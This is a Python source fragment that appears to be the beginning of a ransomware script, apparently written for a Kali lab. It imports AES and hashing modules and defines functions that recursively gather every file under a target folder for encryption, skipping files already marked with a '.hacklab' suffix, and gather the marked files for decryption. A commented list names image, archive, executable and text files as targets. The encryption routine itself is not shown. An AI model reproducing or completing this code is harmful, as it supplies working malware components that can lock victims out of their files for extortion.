
from pathlib import Path
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from Crypto import Random
from sys import stdout
import base64
import os

list_f = []
list_d = []


def write(word):
    stdout.write(word+"                                         \r")
    stdout.flush()
    return True


def getfiles_enc():
    p = Path('/home/kali/Desktop/rans')
    # ['jpg', 'png', 'jpeg', 'iso','exe', 'mp3', "mp4", 'zip', 'rar', 'txt']
    extensions = ["*"]
    for extension in extensions:
        try:
            searche = list(p.glob('**/*.{}'.format(extension)))

            for File in searche:
                File = str(File)
                if File.endswith(".hacklab"):
                    pass
                else:
                    #x = x.split("/")[-1]
                    list_f.append(File)
                    # print(x)
        except OSError:
            print("you must be root !")
    return list_f


def getfiles_dec():
    p = Path('/home/kali/Desktop/rans')
    # ['jpg', 'png', 'jpeg', 'iso','exe', 'mp3', "mp4", 'zip', 'rar', 'txt']
    extensions = ["*"]
    for extension in extensions:
        try:
            searche = list(p.glob('**/*.{}'.format(extension)))
            for File in searche:
                File = str(File)
                if File.endswith(".hacklab"):
                    list_d.append(File)
                else:
                    pass
        except OSError:
            print("you must be root !")
    return list_d
# print(list_f)
